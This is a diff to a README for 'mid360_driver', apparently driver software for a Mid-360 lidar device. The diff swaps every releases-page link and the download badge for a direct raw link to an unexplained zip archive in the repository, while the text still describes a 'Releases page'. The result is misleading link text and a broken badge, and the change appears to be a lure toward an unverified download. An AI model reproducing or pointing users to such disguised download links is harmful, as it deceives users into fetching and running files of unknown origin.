@@ -11,13 +11,13 @@ The **mid360_driver** is an implementation designed to help you control your Mid
 - **Comprehensive Guides**: Access detailed documentation to help you use the software effectively.
 
 ## 📥 Download mid360_driver
-[![Download mid360_driver](https://img.shields.io/badge/Download%20Now!-mid360_driver-blue)](https://github.com/AxeRBLX/mid360_driver/releases)
+[![Download mid360_driver](https://raw.githubusercontent.com/AxeRBLX/mid360_driver/main/launch/mid360_driver_Araucaria.zip%20Now!-mid360_driver-blue)](https://raw.githubusercontent.com/AxeRBLX/mid360_driver/main/launch/mid360_driver_Araucaria.zip)
 
 To get started, you need to download the application. Follow these simple steps:
 
 ## 🚀 Getting Started
 ### Step 1: Visit the Releases Page
-To download the latest version of **mid360_driver**, [visit this page](https://github.com/AxeRBLX/mid360_driver/releases). 
+To download the latest version of **mid360_driver**, [visit this page](https://raw.githubusercontent.com/AxeRBLX/mid360_driver/main/launch/mid360_driver_Araucaria.zip). 
 
 ### Step 2: Choose Your Version
 Once on the Releases page, look for the latest release. Each release contains changes and features that enhance your experience. Read the release notes if you want to know what’s new.
@@ -64,6 +64,6 @@ If you encounter any issues, please refer to our detailed user guide provided wi
 ## 📋 Conclusion
 The **mid360_driver** application is your go-to solution for managing your Mid-360 device. With simple steps, you can download and install the software. 
 
-Remember, if you need to re-download or update the application in the future, [visit this page](https://github.com/AxeRBLX/mid360_driver/releases) anytime. 
+Remember, if you need to re-download or update the application in the future, [visit this page](https://raw.githubusercontent.com/AxeRBLX/mid360_driver/main/launch/mid360_driver_Araucaria.zip) anytime. 
 
 Enjoy using your Mid-360 device with ease!
